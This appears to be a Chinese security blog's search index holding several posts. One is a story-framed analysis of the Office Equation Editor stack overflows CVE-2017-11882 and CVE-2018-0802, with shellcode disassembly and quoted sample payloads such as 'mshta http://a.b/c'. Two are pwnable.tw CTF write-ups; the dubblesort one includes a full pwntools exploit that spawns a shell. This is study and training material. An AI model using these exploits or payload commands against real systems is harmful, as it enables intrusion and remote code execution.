<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[陆续新增旧文章中]]></title>
      <url>/2018/03/31/%E9%99%86%E7%BB%AD%E6%96%B0%E5%A2%9E%E6%97%A7%E6%96%87%E7%AB%A0/</url>
      <content type="html"><![CDATA[<p>Becaus经营不善，之前farbox的博客倒闭…<br>So最近需要将一些旧文章转过来，因为之前的排版不规范，需要手动调整文章格式，较为费事 :-(</p>
<p>另外，前端时间跳槽了~~s</p>
]]></content>
      
        
        <tags>
            
            <tag> 谈谈最近 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[“束发少年”EQNEDT32的陨落]]></title>
      <url>/2018/01/13/%E2%80%9C%E6%9D%9F%E5%8F%91%E5%B0%91%E5%B9%B4%E2%80%9DEQNEDT32%E7%9A%84%E9%99%A8%E8%90%BD/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由非正经分析人员在非工作时间以非常规角度描述的非真实故事。<br>故事剧情纯属虚构，如有雷同，纯属搞事。</p>
<h1 id="惹上麻烦"><a href="#惹上麻烦" class="headerlink" title="惹上麻烦"></a>惹上麻烦</h1><p>近期，<code>Microsoft office</code>一家人惹上大麻烦了，都是收养的小儿子”EQNEDT32”搞的，警察局的人都上门找好几次了，到底是为啥呢？这还得从去年的”CVE-2017-11882”事件说起。<br>2017年7月某天，隔壁Embedi家的老王发现”EQNEDT32”这小子大半夜翻墙出去直到凌晨天刚亮才回来，而且衣服脏脏烂烂，这件事其实并没有引起老王太大的注意，但不巧的是，这情况一直持续好几周，老王最终还是决定告诉”office”一家之长——-老软。<br>老软这个人其实是一个很不错的商人，但仅此而已，他马上找到“EQNEDT32”一问究竟，<br>“EQNEDT32”也很老实，直接告诉老软”最近在研究密室进入这个技术，也就是如何在大门紧锁且没有钥匙的情况下进去把门开开“。<br>老软一乐，”ORz，养了这么大，终于看到儿子能在放学之后除了看书还能有点别的兴趣爱好了“，“那你啥想法，为啥大半夜出去?”老软疑惑问道。<br>”哦，我的软die，可以用铲子挖洞进去啊，我最近就在挖咱家那窗户店，大白天要上课，所以晚上去挖，呵呵“，<br>”卧槽，你这不是坑你爹吗，那你挖的咋样啊？“，<br>”已经挖通了，就等写结题报…“，顾不得听完儿子的话，老软赶紧开车去店铺查看情况。</p>
<h1 id="从CVE-2017-11882-事件说起"><a href="#从CVE-2017-11882-事件说起" class="headerlink" title="从CVE-2017-11882 事件说起"></a>从CVE-2017-11882 事件说起</h1><p>二十分钟的车程这次只开了十二分钟就到了，到店一看，大门敞开，收银台、保险柜连着墙皮被撬走，窗户啥的倒是都在，损失怕不是有点大咯，赶紧报警，警察同志以神速给出了案件的通报，如下:</p>
<h2 id="医学科报告"><a href="#医学科报告" class="headerlink" title="医学科报告:"></a>医学科报告:</h2><p>“EQNEDT32”可能是服用了某种不正常的药物——CVE-2017-11882，关键成分”Equation Native”，其结构如下图，<code>MTEF Byte Stream</code>部分给出的是<code>MTEF V.3版</code>的<code>FONT record</code>结构，因为出问题的就在这个结构。</p>
<p><img src="./2018-01-13-15-41-25.jpg" alt=""><br>在未征得老软的同意，强行对”EQNEDT32”大脑进行了解剖(还活着)，抱歉。<br>发现其处理<code>字体结构</code>时存在问题<br><img src="./2018-01-13-15-50-07.jpg" alt=""><br>处理链 sub_4214C6 -&gt;  sub_4115A7 -&gt; sub_41160F，由于栈上变量vul_val大小只有0x24 = 36字节，即使算上v13，old_ebp也只有44个字节，那么当长度足够长的字体名称(font name) &gt; 44个字节则会覆盖掉返回地址，造成栈缓冲区溢出，轻则心理扭曲，重则走上不归路(原来的返回地址被覆盖了，想回也不好回啊)。<br><img src="./2018-01-13-15-53-24.jpg" alt=""></p>
<h2 id="刑侦科报告"><a href="#刑侦科报告" class="headerlink" title="刑侦科报告:"></a>刑侦科报告:</h2><p> 通过<code>医学科</code>的报告，知道<code>EQNEDT32</code>这小子是存在严重问题，并且作为家长的老软也没有给孩子讲授比较关键的&lt;青少年预防犯罪心理疏导&gt;课程，比如 ASLR、DEP、GS啥啥的，使得<code>EQNEDT32</code>长期处于裸奔的状态。<br>通过对样品(POC)的分析，如下:<br><img src="./2018-01-13-16-15-13.jpg" alt=""><br>选中的蓝色部分即为44字节缓冲区，红色圈中即为”新的返回地址“，对应<code>Call WinExec</code>，当成功覆盖并返回时，栈中的参数1即为 sub_41160F的参数1，也就是输入的那44字节字体名称，造成执行”winexec(‘cmd.exe /ccalc.exe &amp; ‘“)”。<br><img src="./2018-01-13-16-16-49.jpg" alt=""><br>知道问题原因后，警察叔叔通过高科技，锁定了三种有问题的药制品厂家，他们负责人的供词如下:<br>厂A: 没有啊，那个font name给的 cmd <a href="http://a.b/c" target="_blank" rel="external">http://a.b/c</a> ，其他人吃着没事啊<br>厂B: 别瞎说，我们是正规企业，font name参入了mshta <a href="http://a.b/c而已" target="_blank" rel="external">http://a.b/c而已</a><br>厂C: 怎么会，cmd.exe /c %temp%\a.tmp 也有问题吗，ole自动释放的不怪我们啊<br>最后结论: <code>EQNEDT32</code> 自身存在问题，药品只对他造成了严重影响，其他未见到有消费者反馈，店铺被偷主要还是<code>EQNEDT32</code>挖的洞造成犯罪人员有机可乘，负主要责任，目前警方仍在侦破中…</p>
<p>看完<code>通报</code>，老软很生气啊，一来自己对孩子没有教育好，导致孩子吃药还能把脑子吃坏，二来，这店铺的案件怕是得费很久时间还不一定能把犯罪人员抓回来，就算抓回来钱大概也是没了。<br>一首&lt;凉凉&gt;听完，老软决定还是得给儿子进行二次教育，把错过的&lt;青少年预防犯罪心理疏导&gt;课程给儿子上完，但毕竟儿子都这么大了，回炉重造怕是很难，儿子听完ASLR之后就烦了，坚决不听课了，再说跳楼，虽然老软知道儿子说的楼就是台阶(20CM高)，但也不舍得啊，所以也就不再强迫。<br>当然， <code>EQNEDT32</code>也学乖了，并且听了老软的话，他也有了一些变化，一是他学习了ASLR，自身有了一定的抗性(能学会还得亏有重定位表，然后DLLCharacteristics字段设置为0x40即可)，同时“解剖”也不是白做的，医学科老教授给他patch了下脑子，现在就可以可以抵抗CVE-2017-11882，想想也开心。<br><img src="./2018-01-13-17-16-45.jpg" alt=""><br>当然，事情如果到这里结束，怕和”陨落“没有半毛钱关系，所以下面还得搞些事情。</p>
<h1 id="转折"><a href="#转折" class="headerlink" title="转折"></a>转折</h1><p>老软也觉得儿子是真的变好了，逐渐将自己的心思放在了自家的窗户店的经营上，为了避免出现上次店被偷， 他特意请了一个打杂的，专门负责晚上值夜班，生意也渐渐有了起色，几个月相安无事。<br>某天清早，天还没亮，手机突然急匆匆响起来，老软以为闹钟，直接关掉，倒头再睡，没多久，座机又响了，一边骂着”mmp“，一边挪着身体去关座机，抬起电话准备扣下的时候，瞄到来电显示是999，赶紧清醒起来抬手说”喂，我是老软，警察叔叔找我啥事？“ ，”来趟公安局吧，你儿子又出事了“，话音刚毕，老软已经开车在路上了。</p>
<h1 id="接CVE-2018-0802-事件"><a href="#接CVE-2018-0802-事件" class="headerlink" title="接CVE-2018-0802 事件"></a>接CVE-2018-0802 事件</h1><p>到公安局门口才发现，有一堆人在门口，不知谁喊了一句，一伙人把老软给围了起来，要不是有警察叔叔保护，怕老软就真的软了，长官李Sir告诉他，”昨夜，商业街整条街道全部被偷，就你家店铺好着，同时监控显示，你儿子’EQNEDT32’在商业街转悠了一晚上，已经被拘留，但不幸的是，他刚被逮捕没多久，就失去意识，可能有生命危险，目前已经紧急进行了手术，目前医生给出的解释是<code>疑似CVE-2018-0802中毒</code>“，你看下这个报告吧。</p>
<h2 id="医疗诊断说明-分析报告"><a href="#医疗诊断说明-分析报告" class="headerlink" title="医疗诊断说明(分析报告)"></a>医疗诊断说明(分析报告)</h2><p>经过对上次<code>CVE-2017-11882</code>事件发生时，<code>EQNEDT32</code>的医疗数据进行进一步分析，发现其存在另一处的栈溢出问题，如下:<br><img src="./2018-01-14-11-49-10.jpg" alt=""><br>在sub_421E39逻辑中，直接将<code>font Name</code>拷贝到sub_421774栈中，其变量lf的大小为0xAC共172字节，但复制时从+0x1C处开始，所以有0xAC-0x1C为144字节，算上old_ebp有148字节，所以当<code>font name</code>大于148字节时，会造成返回地址覆盖，造成栈溢出。<br><img src="./2018-01-14-11-49-51.jpg" alt=""><br>通过对身体内残留药物(POC)的分析下，数据如下图，<br><img src="./2018-01-14-12-53-56.jpg" alt=""><br>其中蓝色选中数据即为font name的字段，长度为148，红色选中为需要覆盖的返回地址，但由于strcpy复制时会遇到<code>\x00</code>结束，所以实际修改了原始地址的低16位，为什么会选择<code>0x0025</code>呢？因为<code>EQNEDT32</code>没有开启DEP，而且返回地址后有一个<code>font name</code>的指针，那么可通过找到一个<code>ret</code>指令地址，使得让eip指向<code>font name</code>直接执行<code>shellcode</code>了，以此绕过ASLR防护，那这个<code>ret</code>指令的寻找受到了限制(受限于原返回地址)，其只能从rva范围0x20000 ~ 0x200FF寻找，不巧这个值有且只有一个,位于<code>rva = 0x20025</code>，故取0x0025。<br><img src="./2018-01-14-13-16-32.jpg" alt=""><br>既然能够执行任意shellcode(目前长度148还行，内存里面其实还可以再跳一跳，这就很长了)，那当然八仙过海各显神通了。<br>该POC实现的依然是跳入winexec执行cmd，启动因OLE缓存机制事先放在%temp%下的PE文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">						 xor eax,eax</div><div class="line">						 push eax</div><div class="line">0034ee5f 8d442452        lea     eax,[esp+52h]</div><div class="line">0034ee63 50              push    eax</div><div class="line">0034ee64 eb1d            jmp     0034ee83</div><div class="line">0034ee83 90              nop</div><div class="line">0034ee84 90              nop</div><div class="line">0034ee85 90              nop</div><div class="line">0034ee86 8b44242c        mov     eax,dword ptr [esp+2Ch] ss:002b:0034ee3c=013db463</div><div class="line">0034ee8a 662d51a8        sub     ax,0A851h</div><div class="line">0034ee8e ffe0            jmp     eax &#123;EqnEdt32!MFEnumFunc+0x2415 (013d0c12)&#125;</div><div class="line">013d0c12 ff151c684001    call    kernel32!WinExec</div></pre></td></tr></table></figure></p>
<p>当然，也观察到有部分样本通过枚举kernel32模块的导出表，查找ExpandEnvironmentStringsA、CopyFileA、ExitProcess函数，将%temp%下携带的office恶意插件放入word的自启动路径中(把窃听器丢入你家门口啊)<br><img src="./2018-01-14-15-26-21.jpg" alt=""></p>
<p>老软看到这里，心里凉了一半，这小子咋就老犯病呢，这时，李sir跑过来，看起来很捉急，“老软，先冷静一下，我有个不好的消息告诉你，那就是你家’EQNEDT32’快不行了，医生准备2次patch这小子脑子的时候，存在意见分歧，争吵了半个小时，最后决定不patch了，但很遗憾，这小子已经凉了，是医疗事故，赔偿应该没问题的，你要…”话还没说完,老软头犯晕昏过去了.</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>事情已经过去快一周了,老软早恢复了,窗户店依旧开着,日子也和平常一般过着.<br>邻居老王最近生病了,病的不轻,有传言说”EQNEDT32”是老王的儿子,但这又能怎么样呢?毕竟人已经没了。</p>
<h1 id="有问题的药-IOC"><a href="#有问题的药-IOC" class="headerlink" title="有问题的药(IOC)"></a>有问题的药(IOC)</h1><p>C22937CEE87B45BA18C16318533648FB<br>37BF2DF225650B39C9874ECF392A9A9B<br>8E8C2B4AA6C35686945C074306DB041E<br>E27E9C455CBB9F9E5FB65597791FF33A</p>
<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p>格式参考<br><a href="https://stackoverflow.com/questions/15320088/parse-mathtype-mtef-data-from-ole-binary-string" target="_blank" rel="external">https://stackoverflow.com/questions/15320088/parse-mathtype-mtef-data-from-ole-binary-string</a><br>MTEF v3的介绍<br><a href="http://rtf2latex2e.sourceforge.net/MTEF3.html" target="_blank" rel="external">http://rtf2latex2e.sourceforge.net/MTEF3.html</a><br>管家写的”黑凤梨”一篇<br><a href="http://www.freebuf.com/column/159865.html" target="_blank" rel="external">http://www.freebuf.com/column/159865.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwnable.tw-dubblesort]]></title>
      <url>/2017/12/13/pwnable-tw-dubblesort/</url>
      <content type="html"><![CDATA[<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>题目地址<code>https://pwnable.tw/challenge/#4</code><br>这道题目是一个冒泡排序的小程序，主要流程是这样的<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ ./dubblesort </div><div class="line">What your name :nottellyou</div><div class="line">Hello nottellyou</div><div class="line">,How many numbers <span class="keyword">do</span> you what to sort :4</div><div class="line">Enter the 0 number : 6</div><div class="line">Enter the 1 number : 7</div><div class="line">Enter the 2 number : 1</div><div class="line">Enter the 3 number : 2</div><div class="line">Processing......</div><div class="line">Result :</div><div class="line">1 2 6 7 </div><div class="line"></div><div class="line"><span class="comment">### 检查下保护</span></div><div class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ checksec dubblesort </div><div class="line">[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.</div><div class="line">[*] <span class="string">'/home/y11en/Desktop/ctf/pwnable.tw/dubblesort'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">    FORTIFY:  Enabled</div></pre></td></tr></table></figure></p>
<p>题目有2处输入，一处是输入name，另一处是输入排序数组的信息项数和项信息。</p>
<h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>在name输入的地方，由于没有初始化栈数据，导致打印name时后面栈上数据被泄露<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> name[<span class="number">16</span>]; <span class="comment">// [esp+3Ch] [ebp-50h]</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [esp+7Ch] [ebp-10h]</span></div><div class="line"></div><div class="line">v12 = __readgsdword(<span class="number">0x14</span>u);</div><div class="line">sub_8B5();</div><div class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"What your name :"</span>, v8);</div><div class="line">read(<span class="number">0</span>, name, <span class="number">0x40</span>u);                         <span class="comment">// 未初始化内存</span></div><div class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Hello %s,How many numbers do you what to sort :"</span>, (<span class="keyword">int</span>)name);</div></pre></td></tr></table></figure></p>
<h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p>在输入待排序项时，只有8个元素的的数组作为缓存，而实际待排序个数由用户输入 ,当这个大小 &gt;8时，打印栈后数据，当然在其排序逻辑中，可以越界写数据。<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> v10[<span class="number">8</span>]; <span class="comment">// [esp+1Ch] [ebp-70h]</span></div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">  __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)&amp;numcount);</div><div class="line">  idx = numcount;</div><div class="line">  <span class="keyword">if</span> ( numcount )</div><div class="line">  &#123;</div><div class="line">    v4 = v10;</div><div class="line">    v5 = <span class="number">0</span>;</div><div class="line">    <span class="keyword">do</span></div><div class="line">    &#123;</div><div class="line">      __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Enter the %d number : "</span>, v5);</div><div class="line">      fflush(<span class="built_in">stdout</span>);</div><div class="line">      __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)v4);       <span class="comment">// 输入非数字导致该函数不执行实际功能</span></div><div class="line">      ++v5;</div><div class="line">      idx = numcount;</div><div class="line">      ++v4;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> ( numcount &gt; v5 );</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="栈数据泄露"><a href="#栈数据泄露" class="headerlink" title="栈数据泄露"></a>栈数据泄露</h3><p><code>scanf(&quot;%u&quot;,&amp;x)</code> 中%u是输入无符号整型的格式符。<br>为了保证只覆盖需要的数据(跳过stack cookie)，我们需要知道在%u的格式符下，输入除去数字外的字符时不会被接收(不产生赋值操作)，但只输入”+””-“可以被接收并且不产生赋值操作。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ ./dubblesort </div><div class="line">What your name :a</div><div class="line">Hello a</div><div class="line">,How many numbers <span class="keyword">do</span> you what to sort :3</div><div class="line">Enter the 0 number : 0</div><div class="line">Enter the 1 number : +</div><div class="line">Enter the 2 number : 0</div><div class="line">Processing......</div><div class="line">Result :</div><div class="line">0 0 3217242607 y11en@ubuntu:~/Desktop/ctf/pwnable.tw$</div></pre></td></tr></table></figure></p>
<h3 id="栈数据覆盖"><a href="#栈数据覆盖" class="headerlink" title="栈数据覆盖"></a>栈数据覆盖</h3><p>由于不会被接收，所以字母类型的会一直在输入缓冲区放着，导致后面的也会不接收，造成程序唰唰唰的执行到底，这就无法满足我们想跳过前面1个覆盖第2个的需要，而“+”,“-”可以!<br>既然可以控制排序数组的边界，那么我们尝试输入一个超过其缓冲大小的值，使程序越界排序(按值由小到大排序),当然排序的不是目的，覆盖关键数据才是目的，为了劫持程序流程，通过覆盖返回地址的方式，同时保证stack cookie的值不会被改，构造如下数据:<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1.  让 v10到cookie的值全部为0，为0的目的是保证排序时不干扰后面的值</div><div class="line">2.  让cookie的值不变，也即输入+或者-</div><div class="line">3.  覆盖返回地址</div></pre></td></tr></table></figure></p>
<h3 id="libc基址获取"><a href="#libc基址获取" class="headerlink" title="libc基址获取"></a>libc基址获取</h3><ul>
<li><p>方式一<br>通过获取程序主函数的返回地址，可以计算得到 __libc_start_main 的地址，由于提供了so文件，我们可以换算得到基址，但这就使得我们需要让程序的返回地址依然返回的程序主流程中，但这个貌似比较难，首先你得知道程序入口地址实际是什么</p>
</li>
<li><p>方式二<br>通过调试，我们可以发现在name的后面有一个存在libc中的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">pwndbg&gt; x/20wx 0xbfffefdc</div><div class="line">0xbfffefdc:	0x0000fec7	0xbffff2ab	0x0000002f	0x0000009e</div><div class="line">0xbfffefec:	0x00000016	0x00008000	[0xb7fbb000]0xb7fb9244</div><div class="line">0xbfffeffc:	0x80000601	0x800007a9	0x80001fa0	0x00000001</div><div class="line">0xbffff00c:	0x80000b72	0x00000001	0xbffff0d4	0xbffff0dc</div><div class="line">0xbffff01c:	0x84cb9400	0xb7fbb3dc	0xbffff29b	0x80000b2b</div></pre></td></tr></table></figure>
</li>
</ul>
<p>通过<code>vmmap 命令</code>在调试时查看libc的实际地址是 <code>0xb7e09000,</code>，相差<code>0x1b2000</code>，再通过readelf -S 看看本机libc这个地址是什么，再反查目标机器的地址<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">                                        addr   off  size</div><div class="line">...</div><div class="line">本机</div><div class="line">[32] .got.plt          PROGBITS        001b2000 1b1000 000030 04  WA  0   0  4</div><div class="line">目标机器</div><div class="line">[31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>对比目标、目标机器的libc，可以得到如下计算目标libc基地址公式<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">libc = leakaddr - 0x01b0000</div></pre></td></tr></table></figure></p>
<p>知道这个了，通过构造大小为24非\x00字符以及，利用输入时自带的\n，覆盖掉leakaddr的低位，最后在取值时进行处理即可。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>泄露libc地址</li>
<li>找到system, binsh地址</li>
<li>通过排序设置返回地址</li>
</ol>
<h3 id="坑在哪？"><a href="#坑在哪？" class="headerlink" title="坑在哪？"></a>坑在哪？</h3><p>这个题目的栈空间是一个比较坑的地方。<br>在布置栈分布时候，发现我们覆盖的返回地址与实际的返回地址存在偏差，而且通过数次的测试发现这个值有时会变，苦思冥想了很久，一开始以为是如下的主函数结束代码导致的<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">.text:<span class="number">00000B</span>10 loc_B10:                                ; CODE XREF: main+<span class="number">146</span>↑j</div><div class="line">.text:<span class="number">00000B</span>10                 lea     esp, [ebp<span class="number">-0</span>Ch]</div><div class="line">.text:<span class="number">00000B</span>13                 pop     ebx</div><div class="line">.text:<span class="number">00000B</span>14                 pop     esi</div><div class="line">.text:<span class="number">00000B</span>15                 pop     edi</div><div class="line">.text:<span class="number">00000B</span>16                 pop     ebp</div><div class="line">.text:<span class="number">00000B</span>17                 retn</div></pre></td></tr></table></figure></p>
<p>但是，经过我一而再再而三的计算，发现并不是，因为这个栈的空间就是这样平着的，最后发现是函数开头的时候，对esp进行了对齐操作，这样在很大情况下，使得esp会丢失掉部分字节，而ida不知道啊，这也和上面不常见的<code>lea     esp, [ebp-0Ch]</code>进行了对照。<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">.text:<span class="number">000009</span>C3                 push    ebp</div><div class="line">.text:<span class="number">000009</span>C4                 mov     ebp, esp</div><div class="line">.text:<span class="number">000009</span>C6                 push    edi</div><div class="line">.text:<span class="number">000009</span>C7                 push    esi</div><div class="line">.text:<span class="number">000009</span>C8                 push    ebx</div><div class="line">.text:<span class="number">000009</span>C9                 <span class="keyword">and</span>     esp, <span class="number">0F</span>FFFFFF0h ; 这个 真的 我f*ck</div><div class="line">.text:<span class="number">000009</span>CC                 add     esp, <span class="number">0F</span>FFFFF80h</div></pre></td></tr></table></figure></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>最终的利用代码如下:<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">printf_plt = <span class="number">0</span></div><div class="line"></div><div class="line">LOCALFILE = <span class="string">'./dubblesort'</span></div><div class="line">HOST = <span class="string">'chall.pwnable.tw'</span></div><div class="line">PORT = <span class="number">10101</span></div><div class="line"></div><div class="line"><span class="comment">#context.log_level = 'debug'</span></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(LOCALFILE)</div><div class="line">	<span class="comment">#gdb.attach(p)</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(HOST, PORT)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_me_system_binsh</span><span class="params">(libc_base , libso)</span>:</span></div><div class="line">	libc=ELF(libso)</div><div class="line">	system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line">	binsh = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</div><div class="line">	<span class="keyword">return</span> system_addr , binsh</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span><span class="params">()</span>:</span></div><div class="line">	<span class="comment">#gdb.attach(p)</span></div><div class="line">	p.recvuntil(<span class="string">"What your name :"</span>)</div><div class="line">	p.sendline(<span class="string">"AAAA"</span>*<span class="number">6</span>)</div><div class="line">	buf = p.recvuntil(<span class="string">"do you what to sort :"</span>).split(<span class="string">","</span>)[<span class="number">0</span>]</div><div class="line">	b = buf.split(<span class="string">'\n'</span>)[<span class="number">1</span>]	</div><div class="line">	libaddr = u32(<span class="string">"\x00"</span>+b[:<span class="number">3</span>])</div><div class="line">	<span class="keyword">if</span> DEBUG:</div><div class="line">		libaddr -= <span class="number">0x1b2000</span>	<span class="comment">#fix</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		libaddr -= <span class="number">0x1b0000</span>	<span class="comment">#fix</span></div><div class="line">	<span class="keyword">print</span> (hex(libaddr))</div><div class="line">	<span class="keyword">return</span> libaddr</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dubblesort</span><span class="params">(system_addr , binsh)</span>:</span></div><div class="line">	<span class="comment">#能不能pwn看脸</span></div><div class="line">	<span class="keyword">print</span> (<span class="string">"[+] dubblesort &gt;&gt;&gt;"</span>)</div><div class="line">	p.sendline(<span class="string">"36"</span>)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">36</span>):</div><div class="line">		<span class="keyword">print</span> (p.recvuntil(<span class="string">"number : "</span>))</div><div class="line">		<span class="keyword">if</span> i == <span class="number">24</span> : d = <span class="string">"+"</span></div><div class="line">		<span class="keyword">elif</span> i&gt;=<span class="number">25</span> <span class="keyword">and</span> i &lt;= <span class="number">33</span>: </div><div class="line">			<span class="keyword">if</span> i == <span class="number">28</span>:</div><div class="line">				d = <span class="string">"+"</span>	<span class="comment"># +</span></div><div class="line">			<span class="keyword">if</span> i == <span class="number">29</span>:</div><div class="line">				d = str(system_addr)</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				d = str(system_addr)	<span class="comment">#system_addr		</span></div><div class="line">		<span class="keyword">elif</span> i == <span class="number">34</span> <span class="keyword">or</span> i == <span class="number">35</span>: d= str(binsh)	<span class="comment">#binsh</span></div><div class="line">		<span class="keyword">else</span>: d = <span class="string">"0"</span></div><div class="line">		print(d)</div><div class="line">		p.sendline(d)</div><div class="line">	p.recvuntil(<span class="string">"Processing......"</span>)</div><div class="line">	<span class="comment">#gdb.attach(p)</span></div><div class="line">	time.sleep(<span class="number">2</span>)</div><div class="line">	<span class="keyword">print</span> (p.recvuntil(<span class="string">"Result :"</span>))</div><div class="line">	<span class="keyword">print</span> (p.recv())</div><div class="line">	<span class="keyword">print</span> (<span class="string">"[+] dubblesort &lt;&lt;&lt;"</span>)</div><div class="line">	</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	libc = leaklibc()</div><div class="line">	<span class="keyword">if</span> DEBUG:</div><div class="line">		s , sh = give_me_system_binsh(libc , <span class="string">"/lib/i386-linux-gnu/libc-2.23.so"</span>)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		s , sh = give_me_system_binsh(libc , <span class="string">"./libc_32.so_dubblesort.6"</span>)</div><div class="line">	<span class="keyword">print</span> ((s) , (sh))	</div><div class="line">	dubblesort(s,sh)</div><div class="line">	p.sendline(<span class="string">'cat /home/dubblesort/flag'</span>)</div><div class="line">	p.interactive()</div><div class="line">main()</div></pre></td></tr></table></figure></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwnable.tw-calc]]></title>
      <url>/2017/12/10/pwnable-tw-calc/</url>
      <content type="html"><![CDATA[<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>题目地址: <a href="https://pwnable.tw/challenge/#3" target="_blank" rel="external">https://pwnable.tw/challenge/#3</a><br>这道题是一个计算器的小程序，通过输入表达式进行求值，不支持括号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ ./calc </div><div class="line">=== Welcome to SECPROG calculator ===</div><div class="line">1+1</div><div class="line">2</div><div class="line">1+6</div><div class="line">7</div><div class="line">8*6</div><div class="line">48</div><div class="line"></div><div class="line">Merry Christmas!</div><div class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ </div><div class="line"></div><div class="line">[*] <span class="string">'/home/y11en/Desktop/ctf/pwnable.tw/calc'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
<p>通过简单测试，发现输入<code>+100000</code>会造成程序崩溃，调试确定问题原因是发生在<code>calc</code>函数内部<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">unsigned int calc()</div><div class="line">&#123;</div><div class="line">  int value_stack[101]; // [esp+18h] [ebp-5A0h]</div><div class="line">  char inputBuf; // [esp+1ACh] [ebp-40Ch]</div><div class="line">  unsigned int v3; // [esp+5ACh] [ebp-Ch]</div><div class="line"></div><div class="line">  v3 = __readgsdword(0x14u);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    bzero(&amp;inputBuf, 1024u);</div><div class="line">    if ( !get_expr(&amp;inputBuf, 1024) )           // 输入</div><div class="line">      break;</div><div class="line">    init_pool(value_stack);</div><div class="line">    if ( parse_expr(&amp;inputBuf, value_stack) )   // parser</div><div class="line">    &#123;</div><div class="line">      printf((const char *)&amp;unk_80BF804, value_stack[value_stack[0] - 1 + 1]); //这里发生了crash</div><div class="line">      fflush(stdout);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return __readgsdword(0x14u) ^ v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
